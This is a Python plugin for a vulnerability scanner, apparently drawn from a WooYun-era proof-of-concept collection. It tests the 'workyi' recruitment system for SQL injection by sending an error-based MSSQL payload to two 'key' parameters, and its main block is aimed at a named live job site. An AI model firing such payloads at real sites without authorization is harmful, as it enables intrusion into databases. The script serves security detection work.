#!/usr/bin/evn python 
#--coding:utf-8--*--
#Name:workyi人才系统两处注入
#Refer:http://www.wooyun.org/bugs/wooyun-2010-0115124
#Author:xq17

def assign(service, arg):
    if service == "workyi_system":
        return True, arg
                
def audit(arg):
    urls = [
    "persondh/parttime.aspx?key=",
    "persondh/highsalary.aspx?key=",
    ]

    data = "%27%20and%20@@version=0%20or%20%27%%27=%27%"
    for url in urls:
        vul = arg + url + data
        code, head, res, errcode, _ = curl.curl2(vul)
        if code!=0 and 'SQL Server' in res:
            security_hole(arg + url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('workyi_system','http://www.nanlingjob.com/')[1])